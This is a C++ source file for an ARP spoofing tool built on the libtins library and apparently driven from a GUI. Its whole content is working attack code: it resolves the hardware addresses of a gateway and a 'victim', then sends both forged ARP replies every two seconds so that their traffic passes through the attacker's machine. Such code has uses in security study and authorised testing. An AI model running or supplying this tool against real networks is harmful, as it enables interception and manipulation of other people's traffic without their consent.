#include "arp_spoofer.h"

#include <iostream>
#include <string>
#include <stdexcept>
#include <cstdlib>
#include <unistd.h>
#include <thread>
#include <tins/tins.h>

using std::cout;
using std::runtime_error;
using std::endl;
using namespace Tins;

ARP_Spoofer::ARP_Spoofer()
{

}

void ARP_Spoofer::add_victim(std::string router, std::string victim) {
    running = true;
    //detach a thread then return to gui
    std::thread(&ARP_Spoofer::setup, this,  router, victim).detach();
}

void ARP_Spoofer::reset() {
    running = false;
}

int ARP_Spoofer::setup(std::string router, std::string victim) {
    IPv4Address gw_ip, victim_ip;
    EthernetII::address_type own_hw;
    try {
        // Convert dotted-notation ip addresses to integer.
        gw_ip     = router.c_str();
        victim_ip = victim.c_str();
    }
    catch (...) {
        cout << "Invalid ip found...\n";
        return 2;
    }

    NetworkInterface iface;
    NetworkInterface::Info info;
    try {
        // Get the interface which will be the gateway for our requests.
        iface = gw_ip;
        // Lookup the interface id. This will be required while forging packets.
        // Find the interface hardware and ip address.
        info = iface.addresses();
    }
    catch (runtime_error& ex) {
        cout << ex.what() << endl;
        return 3;
    }
    try {
        do_arp_spoofing(iface, gw_ip, victim_ip, info);
    }
    catch (runtime_error& ex) {
        cout << "Runtime error: " << ex.what() << endl;
        return 7;
    }
    return 1;
}

void ARP_Spoofer::do_arp_spoofing(NetworkInterface iface,
                     IPv4Address gw,
                     IPv4Address victim,
                     const NetworkInterface::Info& info) {
    PacketSender sender;
    EthernetII::address_type gw_hw, victim_hw;

    //setup hardware addresses
    gw_hw = Utils::resolve_hwaddr(iface, gw, sender);
    victim_hw = Utils::resolve_hwaddr(iface, victim, sender);

    /* We tell the gateway that the victim is at out hw address,
     * and tell the victim that the gateway is at out hw address */
    ARP gw_arp(gw, victim, gw_hw, info.hw_addr),
        victim_arp(victim, gw, victim_hw, info.hw_addr);
    // We are "replying" ARP requests
    gw_arp.opcode(ARP::REPLY);
    victim_arp.opcode(ARP::REPLY);

    /* The packet we'll send to the gateway and victim.
     * We include our hw address as the source address
     * in ethernet layer, to avoid possible packet dropping
     * performed by any routers. */
    EthernetII to_gw = EthernetII(gw_hw, info.hw_addr) / gw_arp;
    EthernetII to_victim = EthernetII(victim_hw, info.hw_addr) / victim_arp;
    while (running) {
        // Just send them once every 2 seconds.
        sender.send(to_gw, iface);
        sender.send(to_victim, iface);
        sleep(2);
    }
}


